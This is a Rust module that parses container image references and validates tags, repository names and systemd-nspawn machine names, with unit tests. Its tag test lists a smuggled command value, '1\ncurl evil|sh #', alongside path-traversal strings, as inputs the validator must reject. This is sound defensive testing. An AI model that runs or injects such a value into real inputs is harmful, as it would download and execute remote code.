//! Image references: `[registry/]repository[:tag][@digest]`.

use std::fmt;

use anyhow::{anyhow, bail, Context as _, Result};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImageRef {
    pub registry: String,
    pub repository: String,
    pub tag: Option<String>,
    pub digest: Option<String>,
}

impl ImageRef {
    /// Parses a reference. Without a host part the default registry is used; without a tag
    /// or digest the tag is `latest`.
    pub fn parse(input: &str, default_registry: &str) -> Result<Self> {
        let input = input.trim();
        if input.is_empty() {
            bail!("empty image reference");
        }
        // A first component that names a registry, or the default registry itself: a
        // host without a dot or a port (a name on the local network) is one only when
        // it is the configured one, and its references must read back as written.
        let (registry, rest) = match input.split_once('/') {
            Some((first, rest)) if looks_like_registry(first) || first == default_registry => {
                (first.to_string(), rest)
            }
            _ => (default_registry.to_string(), input),
        };
        // Docker Hub's old name is Docker Hub, as the reference's splitDockerDomain has it.
        let registry = if registry == "index.docker.io" {
            "docker.io".to_string()
        } else {
            registry
        };
        let (rest, digest) = match rest.split_once('@') {
            Some((r, d)) => (r, Some(d.to_string())),
            None => (rest, None),
        };
        let (repository, tag) = match rest.rsplit_once(':') {
            Some((r, t)) if !t.contains('/') => (r.to_string(), Some(t.to_string())),
            _ => (rest.to_string(), None),
        };
        if repository.is_empty() {
            bail!("reference {input:?} has no repository name");
        }
        // And its official images are under library/.
        let repository = if registry == "docker.io" && !repository.contains('/') {
            format!("library/{repository}")
        } else {
            repository
        };
        if !valid_repository(&repository) {
            bail!("repository name {repository:?} may only contain lowercase letters, digits, '.', '_', '-' and '/'");
        }
        if let Some(d) = &digest {
            crate::store::validate_digest(d)?;
        }
        // The reference grammar's tag: what a registry takes in a URL, and nothing that
        // ends a line of a script or a table.
        if let Some(t) = &tag {
            if !valid_tag(t) {
                bail!("tag {t:?} may only contain letters, digits, '_', '.' and '-' (128 at most), not starting with '.' or '-'");
            }
        }
        let tag = match (tag, &digest) {
            (Some(t), _) => Some(t),
            (None, Some(_)) => None,
            (None, None) => Some("latest".to_string()),
        };
        Ok(ImageRef {
            registry,
            repository,
            tag,
            digest,
        })
    }

    /// An image reference as Dockerfiles and compose files write them: one that names no
    /// registry comes from Docker Hub, and a first component with an uppercase letter is
    /// a registry, as the reference's splitDockerDomain has it.
    pub fn docker(image: &str) -> Result<Self> {
        let parsed = match image.split_once('/') {
            Some((first, _)) if looks_like_registry(first) => ImageRef::parse(image, "docker.io"),
            // A host by its case alone, which parse would take for a repository's first
            // part: it is the registry given.
            Some((first, _)) if first.chars().any(|c| c.is_ascii_uppercase()) => {
                ImageRef::parse(image, first)
            }
            _ => ImageRef::parse(&format!("docker.io/{image}"), "docker.io"),
        };
        parsed.with_context(|| format!("image {image}"))
    }

    /// The reference as the registry client takes it, built from its parts: parsed from
    /// its text, a registry without a dot or a port would pass for a repository of the
    /// default registry of the client.
    pub fn to_oci(&self) -> Result<oci_client::Reference> {
        let reference = match (&self.digest, &self.tag) {
            (Some(digest), _) => oci_client::Reference::with_digest(
                self.registry.clone(),
                self.repository.clone(),
                digest.clone(),
            ),
            (None, Some(tag)) => oci_client::Reference::with_tag(
                self.registry.clone(),
                self.repository.clone(),
                tag.clone(),
            ),
            (None, None) => oci_client::Reference::with_tag(
                self.registry.clone(),
                self.repository.clone(),
                "latest".to_string(),
            ),
        };
        if reference.registry() != self.registry || reference.repository() != self.repository {
            return Err(anyhow!("invalid OCI reference {}", self));
        }
        Ok(reference)
    }

    /// The machine image name used locally: `fedora:44` becomes `fedora-44`, `debian:latest`
    /// becomes `debian`, a digest reference keeps twelve hex digits of the digest.
    pub fn local_name(&self) -> String {
        // Docker Hub's official images live under library/; nobody wants that in a name.
        let repository = match self.registry.as_str() {
            "docker.io" | "index.docker.io" | "registry-1.docker.io" => self
                .repository
                .strip_prefix("library/")
                .unwrap_or(&self.repository),
            _ => self.repository.as_str(),
        };
        let mut name = repository.replace('/', "-");
        match (&self.tag, &self.digest) {
            (Some(t), _) if t != "latest" => {
                name.push('-');
                name.push_str(t);
            }
            (None, Some(d)) => {
                name.push('-');
                name.push_str(&d[7..19]);
            }
            _ => {}
        }
        sanitize_machine_name(&name)
    }
}

impl fmt::Display for ImageRef {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}/{}", self.registry, self.repository)?;
        if let Some(t) = &self.tag {
            write!(f, ":{t}")?;
        }
        if let Some(d) = &self.digest {
            write!(f, "@{d}")?;
        }
        Ok(())
    }
}

fn looks_like_registry(component: &str) -> bool {
    component == "localhost" || component.contains('.') || component.contains(':')
}

/// A machine name from any text: systemd-nspawn takes it as a host name, made of
/// letters, digits and '-' in parts between dots, no part empty or starting or ending
/// with '-', 64 bytes at most.
pub fn sanitize_machine_name(name: &str) -> String {
    let mapped: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '.' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let tidy = |text: &str| -> String {
        text.split('.')
            .map(|label| label.trim_matches('-'))
            .filter(|label| !label.is_empty())
            .collect::<Vec<_>>()
            .join(".")
    };
    let mut out = tidy(&mapped);
    out.truncate(64);
    tidy(&out)
}

/// A name that stays one entry of the directory it is joined to, which every machine or
/// image name given to nspawn must be before it reaches a path. machined's own image names
/// follow the same rule (no slash, not hidden), so every image it lists passes, whatever
/// else is in its name.
pub fn validate_entry_name(name: &str) -> Result<()> {
    if name.is_empty()
        || name.starts_with('.')
        || name.contains('/')
        || name.chars().any(char::is_control)
    {
        bail!("invalid machine name {name:?}");
    }
    Ok(())
}

/// A name systemd-nspawn takes for --machine, a host name: letters, digits and '-' in
/// parts between dots, no part empty or starting or ending with '-', 64 bytes at most.
pub fn validate_machine_name(name: &str) -> Result<()> {
    if name.is_empty() || name.len() > 64 {
        bail!("invalid machine name {name:?}");
    }
    if !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
    {
        bail!("machine name {name:?} may only contain letters, digits, '.' and '-'");
    }
    if name
        .split('.')
        .any(|label| label.is_empty() || label.starts_with('-') || label.ends_with('-'))
    {
        bail!("machine name {name:?} is no host name: a part between dots is empty, or starts or ends with '-'");
    }
    Ok(())
}

/// A repository's characters as the reference takes them.
pub fn valid_repository(repository: &str) -> bool {
    !repository.is_empty()
        && repository.chars().all(|c| {
            c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '_' | '-' | '/')
        })
}

/// The reference grammar's tag: what a registry takes in a URL, and nothing that ends a
/// line of a script or a table.
pub fn valid_tag(tag: &str) -> bool {
    let mut chars = tag.chars();
    tag.len() <= 128
        && chars
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
}

#[cfg(test)]
mod tests {
    use super::*;

    const HUB: &str = "hub.nspawn.org";

    #[test]
    fn machine_names_are_host_names() {
        for good in ["web", "web-1", "a.b", "nginx-1.27", "A--b"] {
            assert!(validate_machine_name(good).is_ok(), "{good}");
        }
        for bad in [
            "",
            "my_app",
            "-x",
            "x-",
            "a..b",
            ".x",
            "x.",
            "a.-b",
            &"x".repeat(65),
        ] {
            assert!(validate_machine_name(bad).is_err(), "{bad}");
        }
        assert_eq!(
            sanitize_machine_name("google_containers-pause-3.2"),
            "google-containers-pause-3.2"
        );
        assert_eq!(sanitize_machine_name("app-release_1"), "app-release-1");
        let long = format!("{}.x", "a".repeat(63));
        let cut = sanitize_machine_name(&long);
        assert!(validate_machine_name(&cut).is_ok(), "{cut}");
        assert!(validate_machine_name(
            &ImageRef::parse("gcr.io/google_containers/pause:3.2", HUB)
                .unwrap()
                .local_name()
        )
        .is_ok());
    }

    #[test]
    fn docker_hub_is_named_one_way() {
        for (image, want) in [
            ("alpine:3.22", "docker.io/library/alpine:3.22"),
            ("docker.io/alpine:3.22", "docker.io/library/alpine:3.22"),
            ("index.docker.io/alpine", "docker.io/library/alpine:latest"),
            (
                "index.docker.io/library/alpine",
                "docker.io/library/alpine:latest",
            ),
            (
                "docker.io/library/alpine",
                "docker.io/library/alpine:latest",
            ),
            ("user/app:1", "docker.io/user/app:1"),
            ("docker.io/user/app", "docker.io/user/app:latest"),
            ("ghcr.io/o/app:2", "ghcr.io/o/app:2"),
            ("localhost:5000/app", "localhost:5000/app:latest"),
        ] {
            assert_eq!(
                ImageRef::docker(image).unwrap().to_string(),
                want,
                "{image}"
            );
        }
        // An upper-case first part is a registry, as splitDockerDomain takes it.
        let host = ImageRef::docker("MyReg/app:1").unwrap();
        assert_eq!(
            (host.registry.as_str(), host.repository.as_str()),
            ("MyReg", "app")
        );
        assert_eq!(host.to_string(), "MyReg/app:1");
        assert!(ImageRef::docker("MyReg/App:1").is_err());
        // The command line reads Docker Hub's names the same way.
        for (image, want) in [
            ("docker.io/alpine", "docker.io/library/alpine:latest"),
            (
                "index.docker.io/library/nginx",
                "docker.io/library/nginx:latest",
            ),
            (
                "registry-1.docker.io/library/nginx",
                "registry-1.docker.io/library/nginx:latest",
            ),
        ] {
            assert_eq!(ImageRef::parse(image, HUB).unwrap().to_string(), want);
        }
        let nginx = ImageRef::parse("nginx", "docker.io").unwrap();
        assert_eq!(nginx.to_string(), "docker.io/library/nginx:latest");
        assert_eq!(nginx.local_name(), "nginx");
        assert_eq!(
            ImageRef::parse("docker.io/alpine:3.22", HUB)
                .unwrap()
                .local_name(),
            "alpine-3.22"
        );
    }

    #[test]
    fn short_name_gets_default_registry_and_tag() {
        let r = ImageRef::parse("fedora:44", HUB).unwrap();
        assert_eq!(r.registry, HUB);
        assert_eq!(r.repository, "fedora");
        assert_eq!(r.tag.as_deref(), Some("44"));
        assert_eq!(r.to_string(), "hub.nspawn.org/fedora:44");
        assert_eq!(r.local_name(), "fedora-44");

        let r = ImageRef::parse("debian", HUB).unwrap();
        assert_eq!(r.tag.as_deref(), Some("latest"));
        assert_eq!(r.local_name(), "debian");
    }

    #[test]
    fn explicit_registry_with_port() {
        let r = ImageRef::parse("hub.nspawn.test:8443/fedora:44", HUB).unwrap();
        assert_eq!(r.registry, "hub.nspawn.test:8443");
        assert_eq!(r.repository, "fedora");
        assert_eq!(r.tag.as_deref(), Some("44"));
        let r = ImageRef::parse("localhost:5000/team/app", HUB).unwrap();
        assert_eq!(r.registry, "localhost:5000");
        assert_eq!(r.repository, "team/app");
        assert_eq!(r.local_name(), "team-app");
        let r = ImageRef::parse("docker.io/library/busybox:1.36", HUB).unwrap();
        assert_eq!(r.local_name(), "busybox-1.36");
        let r = ImageRef::parse("docker.io/library/archlinux", HUB).unwrap();
        assert_eq!(r.local_name(), "archlinux");
        let r = ImageRef::parse("hub.example/library/x", HUB).unwrap();
        assert_eq!(r.local_name(), "library-x");
    }

    #[test]
    fn digest_reference() {
        let d = format!("sha256:{}", "ab".repeat(32));
        let r = ImageRef::parse(&format!("fedora@{d}"), HUB).unwrap();
        assert_eq!(r.tag, None);
        assert_eq!(r.digest.as_deref(), Some(d.as_str()));
        assert_eq!(r.local_name(), "fedora-abababababab");
        assert!(ImageRef::parse("fedora@sha256:zz", HUB).is_err());
        let upper = format!("fedora@sha256:{}", "AB".repeat(32));
        assert!(ImageRef::parse(&upper, HUB).is_err());
    }

    #[test]
    fn listings_hold_only_what_a_reference_names() {
        assert!(valid_tag("1.36") && valid_tag("_x") && !valid_tag("a\0") && !valid_tag(""));
        assert!(valid_repository("library/busybox") && !valid_repository("a\0b"));
        assert!(!valid_repository(""));
    }

    #[test]
    fn tags_follow_the_reference_grammar() {
        for good in ["44", "1.36.1-musl", "_x", "Latest", &"a".repeat(128)] {
            assert!(
                ImageRef::parse(&format!("app:{good}"), HUB).is_ok(),
                "{good}"
            );
        }
        for bad in [
            "",
            ".x",
            "-x",
            "a b",
            "1\ncurl evil|sh #",
            "a;b",
            &"a".repeat(129),
        ] {
            assert!(
                ImageRef::parse(&format!("app:{bad}"), HUB).is_err(),
                "{bad}"
            );
        }
    }

    #[test]
    fn rejects_bad_input() {
        assert!(ImageRef::parse("", HUB).is_err());
        assert!(ImageRef::parse("Fedora:44", HUB).is_err());
        assert!(ImageRef::parse("hub.example/", HUB).is_err());
    }

    #[test]
    fn oci_conversion_round_trips() {
        let r = ImageRef::parse("fedora:44", HUB).unwrap();
        let o = r.to_oci().unwrap();
        assert_eq!(o.registry(), HUB);
        assert_eq!(o.repository(), "fedora");
        assert_eq!(o.tag(), Some("44"));
    }

    #[test]
    fn names_never_leave_their_directory() {
        for good in ["fedora-44", "web", "a.b", "odd+name,1", "a..b"] {
            assert!(validate_entry_name(good).is_ok(), "{good}");
        }
        for bad in [
            "",
            ".",
            "..",
            "../images",
            "../../../home",
            "a/b",
            ".hidden",
            "a\nb",
        ] {
            assert!(validate_entry_name(bad).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn a_registry_without_a_dot_is_kept_as_such() {
        let r = ImageRef::parse("fedora:44", "zot").unwrap();
        assert_eq!(
            (r.registry.as_str(), r.repository.as_str()),
            ("zot", "fedora")
        );
        let o = r.to_oci().unwrap();
        assert_eq!(
            (o.registry(), o.repository(), o.tag()),
            ("zot", "fedora", Some("44"))
        );
        // What it prints reads back the same under that registry.
        let again = ImageRef::parse(&r.to_string(), "zot").unwrap();
        assert_eq!(again, r);
        // Under another default, that first component is part of the repository.
        let other = ImageRef::parse("zot/fedora:44", "docker.io").unwrap();
        assert_eq!(other.repository, "zot/fedora");
        let o = other.to_oci().unwrap();
        assert_eq!((o.registry(), o.repository()), ("docker.io", "zot/fedora"));
        let d = ImageRef::parse(
            "fedora@sha256:0000000000000000000000000000000000000000000000000000000000000000",
            "zot",
        )
        .unwrap();
        assert_eq!(d.to_oci().unwrap().digest().map(|d| d.len()), Some(71));
    }

    #[test]
    fn machine_names() {
        assert_eq!(sanitize_machine_name("a/b:c"), "a-b-c");
        assert_eq!(sanitize_machine_name("..x"), "x");
        assert!(validate_machine_name("fedora-44").is_ok());
        assert!(validate_machine_name(".hidden").is_err());
        assert!(validate_machine_name("a b").is_err());
    }
}
